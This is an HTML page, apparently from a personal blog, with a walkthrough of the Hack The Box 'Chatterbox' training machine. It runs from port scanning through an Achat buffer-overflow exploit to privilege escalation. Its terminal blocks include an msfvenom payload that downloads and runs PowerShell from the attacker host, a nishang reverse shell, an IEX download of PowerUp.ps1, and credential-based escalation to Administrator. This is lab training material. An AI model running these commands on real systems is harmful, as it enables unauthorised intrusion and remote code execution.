@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Chatterbox - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Chatterbox"><a href="#Hack-The-Box-Chatterbox" class="headerlink" title="Hack The Box - Chatterbox"></a>Hack The Box - Chatterbox</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Chatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete. Its IP address is <code>10.10.10.74</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/chatterbox/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/chatterbox)
+ |
+ |-->{SFire129}#nmap -p- -sV -T 5 10.10.10.74
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 11:31 EDT
+ Nmap scan report for 10.10.10.74
+ Host is up (0.11s latency).
+ Not shown: 65533 filtered ports
+ PORT     STATE SERVICE
+ 9255/tcp open  Achat
+ 9256/tcp open  Achat
+ 
+ Nmap done: 1 IP address (1 host up) scanned in 439.97 secondss</figure></pre>
+ <p>The output nmap show two ports with service Achat, search some exploit.
+ 
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/chatterbox)
+|
+|-->{SFire129}#searchsploit achat
+----------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                               |  Path
+----------------------------------------------------------------------------- ---------------------------------
+Achat 0.150 beta7 - Remote Buffer Overflow                                   | windows/remote/36025.py
+Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                      | windows/remote/36056.rb
+MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities         | php/webapps/32958.txt
+Parachat 5.5 - Directory Traversal                                           | php/webapps/24647.txt
+----------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</figure></pre>
+ <p>There is a vulnerability of remote Buffer Overflow, copy the file 36025.py in current directory. In the python file, there is a msfvenom script, copy and modify for launch with powershell.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/chatterbox)
+ |
+ |-->{SFire129}#grep msfvenom 36025.py
+ # msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89
+ \x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab
+ \xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd
+ \xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef
+ \xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
+ |-------(root@kali)-------|(~/HackTheBox/chatterbox)
+ |
+ |-->{SFire129}#CMD="powershell \"IEX(New-Object New.WebClient).downloadString('http://10.10.14.27/diego.ipp')\""
+ |-------(root@kali)-------|(~/HackTheBox/chatterbox)
+ |
+ |-->{SFire129}#msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/diego.ipp')\""  
+ -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1
+ \xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\
+ xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4
+ \xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python </figure></pre>
+ <p>After launch msfvenom, the output show characters with letter b, will need to delete this letter.
+  <img src="/images/hackthebox/exploit/chatterbox/2.png" alt=""></p>
+  <p>Copy and paste the file <code>Invove-PowerShellTcp.ps1</code> From nishang location. 
+  <img src="/images/hackthebox/exploit/chatterbox/3.png" alt=""></p>
+  <p>Add the line <code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 4446</code>.
+  <img src="/images/hackthebox/exploit/chatterbox/5.png" alt=""></p>
+  <p>There are two files in current location, the exploit and the file diego.ipp.
+  <pre><figure class="highlight plain"> |-->{SFire129}#mv Invoke-PowerShellTcp.ps1 diego.ipp
+ |-------(root@kali)-------|(~/HackTheBox/chatterbox)
+ |
+ |-->{SFire129}#ls
+ 36025.py  diego.ipp
+ |-------(root@kali)-------|(~/HackTheBox/chatterbox)
+ |
+ |-->{SFire129}#</figure></pre>
+ <p>Put the output msfvenom without letter <code>b</code> inside the ile <code>36025.py</code>
+  <img src="/images/hackthebox/exploit/chatterbox/4.png" alt=""></p>
+  <p>Change the section IP address and port with the target.
+ <img src="/images/hackthebox/exploit/chatterbox/1.png" alt=""></p>
+  <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
+<p>With <code>tmux</code> we can launch multi-terminal, in the first terminal, service http, the second run the exploit and third, the netcat listener.
+ <img src="/images/hackthebox/exploit/chatterbox/6.png" alt=""></p>
+ <p>We have a reverse shell without privileges, enumerate with <code> whois /all</code> command, for review user privileges.
+ <img src="/images/hackthebox/exploit/chatterbox/7.png" alt=""></p>
+ 
+ 
+ <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get-Privilges</h2>
+<p>Locate the script  <code>PowerUp.ps1</code> and run in the reverse shell with the command <code>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/PowerUp.ps1')</code>.
+<pre><figure class="highlight plain"> PS C:\Users\alfred\desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/PowerUp.ps1')</figure></pre> 
+<p>The file will allow to enumerate the system. Now run <code>Invoke-AllChecks</code>, the output show the password user <code>Alfred</code>.
+<img src="/images/hackthebox/exploit/chatterbox/10.png" alt=""></p>                                                                            
+<p>Copy and paste de file diego.ipp to diego.ps1 and edit the reverse port to 4447.
+<img src="/images/hackthebox/exploit/chatterbox/8.png" alt=""></p> 
+<p>From the reverse current session, execute the next commands for elevate privileges:
+<p>$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force<br>
+<p>$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)<br>
+<p>$cred<br>
+<pre><figure class="highlight plain">PS C:\Users\Alfred\Desktop> $SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+PS C:\Users\Alfred\Desktop> $cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
+PS C:\Users\Alfred\Desktop> $cred
+
+UserName                                                               Password
+--------                                                               --------
+Administrator                                      System.Security.SecureString
+
+
+PS C:\Users\Alfred\Desktop></figure></pre>
+<p>Run netcat listener over 4447 port and execute from reverse current session the command <code>Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/diego.ps1')" -Credential $cred</code>.
+<img src="/images/hackthebox/exploit/chatterbox/9.png" alt=""></p>
+<p>The image show the  3 screens, with the execution command, finally we are users administrator.
+ <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+<pre><figure class="highlight plain"> PS C:\Windows\system32> cd c:\Users
+ PS C:\Users> dir
+ 
+ 
+     Directory: C:\Users
+ 
+ 
+ Mode                LastWriteTime     Length Name
+ ----                -------------     ------ ----
+ d----        12/10/2017   1:34 PM            Administrator
+ d----        12/10/2017   9:18 AM            Alfred
+ d-r--         4/11/2011  10:21 PM            Public
+ 
+ 
+ PS C:\Users> cd Alfred
+ PS C:\Users\Alfred> cd Desktop
+ PS C:\Users\Alfred\Desktop> dir
+ 
+ 
+     Directory: C:\Users\Alfred\Desktop
+ 
+ 
+ Mode                LastWriteTime     Length Name
+ ----                -------------     ------ ----
+ -a---        12/10/2017   6:50 PM         32 user.txt
+ 
+ 
+ PS C:\Users\Alfred\Desktop> type user.txt
+***Here you could find the user flag***
+ PS C:\Users\Alfred\Desktop>
+ 
+ 
+ PS C:\Users\Alfred\Desktop>whoami
+ chatterbox\administrator
+ PS C:\Users\Alfred\Desktop> cd ..
+ PS C:\Users\Alfred> cd ..
+ PS C:\Users> cd Administrator
+ PS C:\Users\Administrator> cd Desktop
+ PS C:\Users\Administrator\Desktop> dir
+ 
+ 
+     Directory: C:\Users\Administrator\Desktop
+ 
+ 
+ Mode                LastWriteTime     Length Name
+ ----                -------------     ------ ----
+ -a---        12/10/2017   6:50 PM         32 root.txt
+ 
+ 
+ PS C:\Users\Administrator\Desktop> type root.txt
+ ***Here you could find the root flag***
+ PS C:\Users\Administrator\Desktop></figure></pre>
+ <p>In the first reverse shell, Not have privileges, but can get the privileges in the files with the command <code>cacls</code> for read the files.
+<pre><figure class="highlight plain"> PS C:\Users\administrator\desktop> cacls root.txt
+C:\Users\administrator\desktop\root.txt CHATTERBOX\Administrator:F
+
+PS C:\Users\administrator\desktop> cacls root.txt /t /e /p Alfred:F
+processed file: C:\Users\administrator\desktop\root.txt
+PS C:\Users\administrator\desktop> cacls root.txt
+C:\Users\administrator\desktop\root.txt CHATTERBOX\Administrator:F
+                                        CHATTERBOX\Alfred:F</figure></pre>
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-06-21</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#Windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#cacls</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Powershell</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
